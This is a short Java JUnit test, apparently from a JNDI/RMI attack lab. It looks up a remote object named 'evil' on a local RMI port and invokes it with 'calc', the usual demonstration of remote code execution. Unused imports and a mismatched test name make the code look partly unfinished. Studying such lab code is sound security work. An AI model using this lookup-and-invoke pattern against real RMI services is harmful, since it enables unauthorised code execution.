import com.server.LdapServer;
import org.junit.Test;

import javax.management.remote.rmi.RMIConnection;
import java.lang.reflect.Method;
import java.net.FileNameMap;
import java.rmi.Naming;
import java.rmi.Remote;

public class TestJndi {
    @Test
    public void testLdapConnection() throws Exception{
        Remote lookup1 = Naming.lookup("rmi://127.0.0.1:21658/evil");
        RMIConnection lookup = (RMIConnection) lookup1;
        lookup.invoke(null, "calc", null, null, null);
    }
}
